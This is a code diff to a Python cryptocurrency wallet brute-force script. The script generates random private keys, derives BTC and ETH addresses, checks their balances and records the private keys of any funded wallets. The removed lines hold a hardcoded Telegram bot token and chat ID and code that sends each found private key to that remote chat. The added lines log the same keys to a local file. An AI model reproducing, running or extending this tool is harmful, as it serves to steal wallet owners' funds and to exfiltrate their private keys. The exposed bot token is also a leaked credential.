@@ -3,24 +3,12 @@ import random
 import time
 import requests
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from telegram import Bot, Update
-from telegram.ext import CommandHandler, Updater, CallbackContext
 from hdwallet import HDWallet
 from hdwallet.symbols import BTC, ETH
 from colorama import Fore, init
 from pyfiglet import Figlet
 
 init(autoreset=True)
-
-# Telegram bot token and chat ID
-TELEGRAM_BOT_TOKEN = '7078848334:AAF7OCrUyDgP_pq2JDSTASFABj6VmKaNLxU'
-TELEGRAM_CHAT_ID = '7104020294'
-
-# Initialize Telegram bot
-bot = Bot(token=TELEGRAM_BOT_TOKEN)
-updater = Updater(bot_token=TELEGRAM_BOT_TOKEN, use_context=True)  # Change 'token' to 'bot_token'
-
-found_wallets = []
 
 def title():
     f = Figlet(font='standard')
@@ -48,9 +36,6 @@ def get_balance(addr: str) -> float:
     except (KeyError, requests.RequestException) as e:
         print(f"Error fetching Bitcoin balance: {e}")
         return 0.0
-
-def send_to_telegram(message: str):
-    bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message)
 
 def check_wallet(private_key):
     hd_btc = HDWallet(symbol=BTC)
@@ -115,17 +100,15 @@ def main():
 
                     if any(balance > 0 for balance in balances.values()):
                         ff += 1
-                        message = ""
-                        for addr_type, addr in btc_addrs.items():
-                            balance = balances.get(addr_type, 0.0)
-                            if balance > 0:
-                                message += f'BTC Address ({addr_type}): {addr}\nBalance: {balance}\n'
-                        if eth_balance_value > 0:
-                            message += f'ETH Address: {eth_addr}\nBalance: {eth_balance_value}\n'
-                        message += f'Private Key: {private_key}\n'
-
-                        send_to_telegram(message)
-                        found_wallets.append(message)
+                        with open('found_wallets.txt', 'a') as f:
+                            f.write(f'Scan: {z-1}, Found: {ff}\n')
+                            for addr_type, addr in btc_addrs.items():
+                                balance = balances.get(addr_type, 0.0)
+                                if balance > 0:
+                                    f.write(f'BTC Address ({addr_type}): {addr}\nBalance: {balance}\n')
+                            if eth_balance_value > 0:
+                                f.write(f'ETH Address: {eth_addr}\nBalance: {eth_balance_value}\n')
+                            f.write(f'Private Key: {private_key}\n\n')
 
                     futures = [f for f in futures if not f.done()]
 
@@ -133,31 +116,6 @@ def main():
                 print(f"An error occurred: {e}")
                 print("Restarting in 5 seconds...")
                 time.sleep(5)
-
-def start(update: Update, context: CallbackContext):
-    update.message.reply_text('Bot is running!')
-
-def status(update: Update, context: CallbackContext):
-    update.message.reply_text(f'Scans: {z}, Found: {ff}')
-
-def export_wallets(update: Update, context: CallbackContext):
-    if found_wallets:
-        with open('found_wallets.txt', 'w') as f:
-            for wallet in found_wallets:
-                f.write(f'{wallet}\n')
-        update.message.reply_text('Exported found wallets to found_wallets.txt')
-    else:
-        update.message.reply_text('No wallets with positive balance found.')
-
-# Adding command handlers to the dispatcher
-updater.dispatcher.add_handler(CommandHandler('start', start))
-updater.dispatcher.add_handler(CommandHandler('status', status))
-updater.dispatcher.add_handler(CommandHandler('export_wallets', export_wallets))
-
-# Start the bot in a separate thread
-import threading
-bot_thread = threading.Thread(target=updater.start_polling)
-bot_thread.start()
 
 if __name__ == "__main__":
     main()
